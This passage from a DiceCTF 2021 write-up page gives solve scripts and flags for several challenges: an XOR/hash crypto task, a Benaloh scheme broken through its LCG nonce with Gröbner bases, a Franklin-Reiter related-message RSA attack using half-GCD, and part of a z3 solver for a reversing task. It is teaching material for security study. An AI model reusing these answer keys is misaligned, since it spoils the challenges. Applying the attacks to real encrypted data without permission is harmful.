    <span style="color:#66d9ef">return</span> bytes(a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B))

inputs <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">11693387</span>,
    <span style="color:#ae81ff">2</span>: <span style="color:#ae81ff">11338704</span>,
    <span style="color:#ae81ff">3</span>: <span style="color:#ae81ff">7371799</span>,
    <span style="color:#ae81ff">4</span>: <span style="color:#ae81ff">2815776</span>
}
msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}:{}:{}:{}&#34;</span><span style="color:#f92672">.</span>format(inputs[<span style="color:#ae81ff">1</span>], inputs[<span style="color:#ae81ff">2</span>], inputs[<span style="color:#ae81ff">3</span>], inputs[<span style="color:#ae81ff">4</span>])
msg <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>)

m <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha512()
m<span style="color:#f92672">.</span>update(msg)
m<span style="color:#f92672">.</span>digest()

xor_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">),u</span><span style="color:#ae81ff">\x1b\x1d</span><span style="color:#e6db74">E:</span><span style="color:#ae81ff">\xa8</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">}&amp;</span><span style="color:#ae81ff">\xc7\x90\xbb\xce</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\xf5\x17\x89\xd7\xfa\x07\x86\x83\xfa\x9b</span><span style="color:#e6db74">^</span><span style="color:#ae81ff">\xcb\xd7</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">W</span><span style="color:#ae81ff">\xca\xce</span><span style="color:#e6db74">XD7&#39;</span>

flag <span style="color:#f92672">=</span> xor(m<span style="color:#f92672">.</span>digest(),xor_flag)
<span style="color:#66d9ef">print</span>(flag)
<span style="color:#75715e"># dice{N0w_YoUr3_Th1nkIn6_Wi7H_pR0t0c015}</span>
</code></pre></div><h3 id="benaloh">benaloh</h3>
<p>This writeup is referenced from <a href="https://priv.pub/posts/dicectf-2021/">defund</a></p>
<h4 id="analysis-3">Analysis</h4>
<p>This is a <a href="https://en.wikipedia.org/wiki/Benaloh_cryptosystem">Benaloh cryptosystem</a> challenge, the code is short:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># benaloh</span>
<span style="color:#f92672">from</span> Crypto.Random.random <span style="color:#f92672">import</span> randrange
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> getPrime, GCD

r <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keygen</span>():
	<span style="color:#66d9ef">while</span> True:
		p <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">1024</span>)
		a, b <span style="color:#f92672">=</span> divmod(p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, r)
		<span style="color:#66d9ef">if</span> b <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> GCD(r, a) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
			<span style="color:#66d9ef">break</span>
	<span style="color:#66d9ef">while</span> True:
		q <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">1024</span>)
		<span style="color:#66d9ef">if</span> GCD(r, q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
			<span style="color:#66d9ef">break</span>
	n <span style="color:#f92672">=</span> p<span style="color:#f92672">*</span>q
	phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r
	y <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
	<span style="color:#66d9ef">while</span> True:
		y <span style="color:#f92672">=</span> randrange(n)
		x <span style="color:#f92672">=</span> pow(y, phi, n)
		<span style="color:#66d9ef">if</span> x <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
			<span style="color:#66d9ef">break</span>
	log <span style="color:#f92672">=</span> {pow(x, i, n): i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(r)}
	<span style="color:#66d9ef">return</span> (n, y), (n, phi, log)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(data, pk):
	n, y <span style="color:#f92672">=</span> pk
	u <span style="color:#f92672">=</span> randrange(n)
	a <span style="color:#f92672">=</span> randrange(n)
	c <span style="color:#f92672">=</span> randrange(n)
	<span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>hex():
		<span style="color:#66d9ef">yield</span> pow(y, int(m, <span style="color:#ae81ff">16</span>), n) <span style="color:#f92672">*</span> pow(u, r, n) <span style="color:#f92672">%</span> n
		u <span style="color:#f92672">=</span> (a<span style="color:#f92672">*</span>u <span style="color:#f92672">+</span> c) <span style="color:#f92672">%</span> n

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(data, sk):
	n, phi, log <span style="color:#f92672">=</span> sk
	<span style="color:#66d9ef">return</span> bytes<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(f<span style="color:#e6db74">&#39;{log[pow(z, phi, n)]:x}&#39;</span> <span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> data))

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
	<span style="color:#f92672">from</span> local <span style="color:#f92672">import</span> flag
	pk, sk <span style="color:#f92672">=</span> keygen()
	<span style="color:#66d9ef">print</span>(pk)
	<span style="color:#66d9ef">for</span> z <span style="color:#f92672">in</span> encrypt(flag, pk):
		<span style="color:#66d9ef">print</span>(z)

</code></pre></div><p>The block size is <code>r = 17</code>, we have <code>public key</code> and <code>encrypted flag</code>. But different from the standard <code>Benaloh cryptosystem</code>, the <code>nonce</code> of this challenge is generated with <code>LCG</code>. But we don&rsquo;t know <code>a,u,c</code>.</p>
<p>So what can we do? Focus on the <code>encrypted flag</code>, also called <code>z</code> in this challenge. We can write its expression:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">z_i <span style="color:#f92672">=</span> (y <span style="color:#f92672">**</span> m <span style="color:#f92672">*</span> u_i <span style="color:#f92672">**</span> r) <span style="color:#f92672">%</span> n
u_i <span style="color:#f92672">=</span> (a <span style="color:#f92672">*</span> u_(i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> c) <span style="color:#f92672">%</span> n
</code></pre></div><p>If we have more  <code>z-m pair</code>, then we can construct some multivariate polynomials with unkowned <code>u,a,c</code>, use <a href="https://en.wikipedia.org/wiki/Gr%C3%B6bner_basis">Gröbner basis</a> reduction to help us for finding roots. It also preserves some key properties about the original set. In <code>sagemath</code> the output just like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[c<span style="color:#f92672">^</span><span style="color:#ae81ff">17</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">13458759594676198214694259395597811037811941351192625227467096501437492626016103500732912703741531580440688721418838601356917454469197042860724974820711811807100911025568783389529011375041774037357224005532374737711385620250882965751966936631506501563981475218917679272036145000202705372625367221715684331874911123897488465876418098777295294085721730060353781081936511989823993750197757906274895327225414708735228502620853964519743121169419595741484437884476968407623319417909836503756421684133026872563003628309754191206638310830457160948939228910390136165954060484629537550098482941917500740029457719651678576263154</span>, u <span style="color:#f92672">+</span> <span style="color:#ae81ff">316517663849777910225660080408784696167924695113642531974131497480910378366220174342126802849049539663694903310250609244514828218236832782037217816236893097704270918578097042085736644370848172633750954486260895306171096242584274887827086225061772333809429993942553814439329476648071612609884623299988660650179852653163795008516189222405687351351109996651789580351715791017438004730807486178553378753383208033005732492151858373741617384858699269732745326858016880380595482272818312327147435234514885344494904297204434448240694768364394802707422951925732088102047687537430858233649919876359703515785224783225069089980</span><span style="color:#f92672">*</span>c, a <span style="color:#f92672">+</span> <span style="color:#ae81ff">1661216876440720795949971760316375297223780761108674238540808158213078980164656368815536594328510194746888627111987313473237775055677284466208525500885764198070567384544945702715900113900083864927826969971664844458658182797143288816769247910804809014527517142248172045349023280003970829981831679105885916798790488166987740245714277585192487684558508003531661909679977119963644699703649749483269350109143839889546691324949566145320193582552061487407920959141668364668452895857576184480913586198770372641315376888430566581697787292145901485440997213094118917877437294945649019459331559374549028782748215151722129896006</span>]
</code></pre></div><p>We can use these informations to help us for solving this challenge and finally get the flag.</p>
<h4 id="exp-3">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># exp.sage</span>
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> 

flag_head <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;dice{&#34;</span>
flag_head <span style="color:#f92672">=</span> flag_head<span style="color:#f92672">.</span>hex()

r <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>

data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;output.txt&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>readlines()
(n, y) <span style="color:#f92672">=</span> eval(data[<span style="color:#ae81ff">0</span>])
F <span style="color:#f92672">=</span> Zmod(n)
y <span style="color:#f92672">=</span> F(y)
enc <span style="color:#f92672">=</span> [F(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> data[<span style="color:#ae81ff">1</span>:]]

m <span style="color:#f92672">=</span> dict()
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x10</span>):
    m[y <span style="color:#f92672">^</span> i] <span style="color:#f92672">=</span> i

P<span style="color:#f92672">.&lt;</span>u, a, c<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(F)

G <span style="color:#f92672">=</span> []
pol <span style="color:#f92672">=</span> u
<span style="color:#75715e"># z = y ^ m * u ^ r</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(flag_head)):
    g <span style="color:#f92672">=</span> pol <span style="color:#f92672">^</span> r <span style="color:#f92672">-</span> enc[i] <span style="color:#f92672">/</span> y <span style="color:#f92672">^</span> int(flag_head[i],<span style="color:#ae81ff">16</span>)
    G<span style="color:#f92672">.</span>append(g)
    pol <span style="color:#f92672">=</span> a <span style="color:#f92672">*</span> pol <span style="color:#f92672">+</span> c

B <span style="color:#f92672">=</span> Ideal(G)<span style="color:#f92672">.</span>groebner_basis()
<span style="color:#66d9ef">print</span>(B)

flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#75715e"># u = - x * c</span>
<span style="color:#75715e"># c ^ r = - y</span>
<span style="color:#75715e"># z / ( (- x) ^ r * - y) = z / ((u / c) ^ r * c ^ r) = z / (u ^ r)</span>
pol <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> B[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>monomial_coefficient(c) <span style="color:#f92672">*</span> c
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc)):
    result <span style="color:#f92672">=</span> enc[i] <span style="color:#f92672">/</span> (pol<span style="color:#f92672">.</span>monomial_coefficient(c) <span style="color:#f92672">^</span> r <span style="color:#f92672">*</span> <span style="color:#f92672">-</span> B[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>constant_coefficient())
    flag <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">4</span>
    flag <span style="color:#f92672">|=</span> m[result]
    pol <span style="color:#f92672">=</span> <span style="color:#f92672">-</span> B[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>constant_coefficient() <span style="color:#f92672">*</span> pol <span style="color:#f92672">+</span> c

flag <span style="color:#f92672">=</span> long_to_bytes(flag)
<span style="color:#66d9ef">print</span>(flag)
<span style="color:#75715e"># dice{gr:obner!_!}</span>
</code></pre></div><h3 id="plagiarism">plagiarism</h3>
<p>This writeup is referenced from <a href="https://mystiz.hk/posts/2021-02-15-dicectf-1/#plagiarism">mystiz</a></p>
<h4 id="analysis-4">Analysis</h4>
<p>This challenge is and <code>Related Message Attack</code> on RSA:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Two agents, Blex <span style="color:#f92672">and</span> Kane, have simultaneously known very secret message <span style="color:#f92672">and</span> transmitted it to Center<span style="color:#f92672">.</span> You know following:
<span style="color:#ae81ff">1</span>) They used RSA <span style="color:#66d9ef">with</span> this public key
<span style="color:#ae81ff">2</span>) They sent exactly the same messages <span style="color:#66d9ef">except</span> the signatures (name appended, eg<span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;[message]Blex&#34;</span>)
<span style="color:#ae81ff">3</span>) They did encryption this way:

m <span style="color:#f92672">=</span> int(message<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;hex&#34;</span>), <span style="color:#ae81ff">16</span>)
c <span style="color:#f92672">=</span> pow(m, e, N)

<span style="color:#ae81ff">4</span>) And here are cryptograms you have intercepted:

N <span style="color:#f92672">=</span> <span style="color:#ae81ff">25898966400928827905718377946331123070958718286581765316565582158865227877882475404853218079499084099440419144196215764927720893687968939899067275095801562867742359933997487928281899714724738097735994026225339488710478292473051567851786254924548138570069406420407124627567648479424564834446192417334669768477661434992797176428220265984651288944265998446714590797833756720922745187467388408600309665467669255896919554072379878017822219455974525233467767926938557154083882126002952139561283708342676308894318951822068027821029295524097544028901807902120777407151278396388621981625398417573347316888458337381776303199529</span>

e <span style="color:#f92672">=</span> <span style="color:#ae81ff">1048577</span>

ciphertext_Blex <span style="color:#f92672">=</span> <span style="color:#ae81ff">11140520553087800834883326476247582685177207584737264356946559762068509060522907835540767944557089926814767920501376431871780404000550271362410228709616559148950928004959648199391157781102695421411667843970881959939688515679415870087007797819271601359811630724878746762862603629420061133824605384527474682526549557804674160851967543475275374840169790764048711047622418045734436512050742433282306694490346907876574514077395835974083376649624559301087384766644865104383786285302561584731767419571603248493060257358632833957327996996960955767927114473513709882904104552609194519132931270741118197821776138632855021619178</span>

ciphertext_Kane <span style="color:#f92672">=</span> <span style="color:#ae81ff">2922817623733019475805146570530296261205732600738503605503192845278422660686627490817081424885152809772315629265930072636690234953045955503581182067349322827011065359648958225896393305011175960879100475146203207801533980643261035226402857047007061320653920746872424363923515091038846823007819033456503365649022294092944985887626605207259444051959239244136999684366533551627508385114998024232490369665950339127904350803268889205463047713233591604324960184727360413931125906144631968128488876241314939855024305076160092193380013725939761970042406866169417457376487954247442308318888399299295082898238584625937490546472</span>

Now tell me that secret message<span style="color:#960050;background-color:#1e0010">!</span> (The answer <span style="color:#66d9ef">for</span> this task starts <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;dice{&#39;</span>) 
</code></pre></div><p>The difference from <a href="https://hxp.io/blog/1/RuCTF%20Quals%202014:%20Crypto%20500%20%22decrypt%20message%22%20writeup/">RuCTF Quals 2014: decrypt message</a> is that e is bigger than before.</p>
<p>So the original method will fail due to runtime issues.</p>
<p>We can use <a href="http://web.cs.iastate.edu/~cs577/handouts/polydivide.pdf">HGCD</a> instead of GCD to solve this challenge.</p>
<h4 id="exp-4">Exp</h4>
<p>This code is written by <code>the entire country of ireland</code> in <a href="https://discord.gg/CbCXtrDE5m">discord</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> binascii
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">HGCD</span>(p1, p2):
    deg1 <span style="color:#f92672">=</span> p1<span style="color:#f92672">.</span>degree()
    deg2 <span style="color:#f92672">=</span> p2<span style="color:#f92672">.</span>degree()
    
    m <span style="color:#f92672">=</span> deg1 <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
    
    <span style="color:#66d9ef">if</span> deg2 <span style="color:#f92672">&lt;=</span> deg1 <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>:
        <span style="color:#66d9ef">return</span> Matrix(R, [[<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>],[<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>]])

    p1_coeffs <span style="color:#f92672">=</span> p1<span style="color:#f92672">.</span>coefficients()
    b1 <span style="color:#f92672">=</span> R(p1_coeffs[m:])
    c1 <span style="color:#f92672">=</span> R(p1_coeffs[:m])

    p2_coeffs <span style="color:#f92672">=</span> p2<span style="color:#f92672">.</span>coefficients()
    b2 <span style="color:#f92672">=</span> R(p2_coeffs[m:])
    c2 <span style="color:#f92672">=</span> R(p2_coeffs[:m])

    M <span style="color:#f92672">=</span> HGCD(b1, b2)

    v <span style="color:#f92672">=</span> M <span style="color:#f92672">*</span> vector([p1, p2])
    d,e <span style="color:#f92672">=</span> v

    q,r <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>quo_rem(e)
    f <span style="color:#f92672">=</span> r
    U <span style="color:#f92672">=</span> Matrix(R, [[<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>], [<span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span>q]])

    m <span style="color:#f92672">=</span> m <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>

    e_coeffs <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>coefficients()
    g1 <span style="color:#f92672">=</span> R(e_coeffs[m:])
    h1 <span style="color:#f92672">=</span> R(e_coeffs[:m])

    f_coeffs <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>coefficients()
    g2 <span style="color:#f92672">=</span> R(f_coeffs[m:])
    h2 <span style="color:#f92672">=</span> R(f_coeffs[:m])


    S <span style="color:#f92672">=</span> HGCD(g1, g2)

    Result <span style="color:#f92672">=</span> S <span style="color:#f92672">*</span> U <span style="color:#f92672">*</span> M
    <span style="color:#66d9ef">return</span> Result


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GCD</span>(p1, p2):
    q,r <span style="color:#f92672">=</span> p1<span style="color:#f92672">.</span>quo_rem(p2)
    <span style="color:#66d9ef">if</span> r <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        <span style="color:#66d9ef">return</span> p2
    p1,p2 <span style="color:#f92672">=</span> p2, r
    
    M <span style="color:#f92672">=</span> HGCD(p1, p2)
    
    v <span style="color:#f92672">=</span> M <span style="color:#f92672">*</span> vector([p1, p2])
    b1, b2 <span style="color:#f92672">=</span> v
    
    q,r <span style="color:#f92672">=</span> b1<span style="color:#f92672">.</span>quo_rem(b2)
    
    <span style="color:#66d9ef">if</span> r <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        <span style="color:#66d9ef">return</span> b2
    
    <span style="color:#66d9ef">return</span> GCD(b2, r)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">franklin_reiter</span>(p1, p2):
    g <span style="color:#f92672">=</span> GCD(p1, p2)
    a0, a1 <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>coefficients()
    <span style="color:#66d9ef">return</span> Integer(<span style="color:#f92672">-</span>a0<span style="color:#f92672">/</span>a1)

N <span style="color:#f92672">=</span> <span style="color:#ae81ff">25898966400928827905718377946331123070958718286581765316565582158865227877882475404853218079499084099440419144196215764927720893687968939899067275095801562867742359933997487928281899714724738097735994026225339488710478292473051567851786254924548138570069406420407124627567648479424564834446192417334669768477661434992797176428220265984651288944265998446714590797833756720922745187467388408600309665467669255896919554072379878017822219455974525233467767926938557154083882126002952139561283708342676308894318951822068027821029295524097544028901807902120777407151278396388621981625398417573347316888458337381776303199529</span>
e <span style="color:#f92672">=</span> <span style="color:#ae81ff">1048577</span>
c1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">11140520553087800834883326476247582685177207584737264356946559762068509060522907835540767944557089926814767920501376431871780404000550271362410228709616559148950928004959648199391157781102695421411667843970881959939688515679415870087007797819271601359811630724878746762862603629420061133824605384527474682526549557804674160851967543475275374840169790764048711047622418045734436512050742433282306694490346907876574514077395835974083376649624559301087384766644865104383786285302561584731767419571603248493060257358632833957327996996960955767927114473513709882904104552609194519132931270741118197821776138632855021619178</span>
c2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2922817623733019475805146570530296261205732600738503605503192845278422660686627490817081424885152809772315629265930072636690234953045955503581182067349322827011065359648958225896393305011175960879100475146203207801533980643261035226402857047007061320653920746872424363923515091038846823007819033456503365649022294092944985887626605207259444051959239244136999684366533551627508385114998024232490369665950339127904350803268889205463047713233591604324960184727360413931125906144631968128488876241314939855024305076160092193380013725939761970042406866169417457376487954247442308318888399299295082898238584625937490546472</span>
delta  <span style="color:#f92672">=</span> int(binascii<span style="color:#f92672">.</span>hexlify(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Kane&#39;</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> int(binascii<span style="color:#f92672">.</span>hexlify(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Blex&#39;</span>), <span style="color:#ae81ff">16</span>)

R<span style="color:#f92672">.&lt;</span>x<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(IntegerModRing(N))
p1 <span style="color:#f92672">=</span> x<span style="color:#f92672">^</span>e <span style="color:#f92672">-</span> c1
p2 <span style="color:#f92672">=</span> (x<span style="color:#f92672">+</span>delta)<span style="color:#f92672">^</span>e <span style="color:#f92672">-</span> c2

flag <span style="color:#f92672">=</span> franklin_reiter(p1, p2)
flag <span style="color:#f92672">=</span> long_to_bytes(flag)
<span style="color:#66d9ef">print</span>(flag)
</code></pre></div><h2 id="reverse">Reverse</h2>
<h3 id="babymix">babymix</h3>
<h4 id="analysis-5">Analysis</h4>
<p>Just use z3 to solve it.</p>
<h4 id="exp-5">Exp</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> z3 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

a2 <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">22</span>):
    a2<span style="color:#f92672">.</span>append(BitVec(<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">+</span>str(i),<span style="color:#ae81ff">9</span>))
s <span style="color:#f92672">=</span> Solver()
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">153</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">217</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">16</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">232</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">328</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">74</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">166</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">18</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">413</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">21</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">98</span>)
s<span style="color:#f92672">.</span>add((a2[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">13</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">12</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">85</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">7</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">77</span>)
s<span style="color:#f92672">.</span>add(a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">-</span> a2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (a2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">^</span> a2[<span style="color:#ae81ff">14</span>]) <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">+</span> a2[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">384</span>)
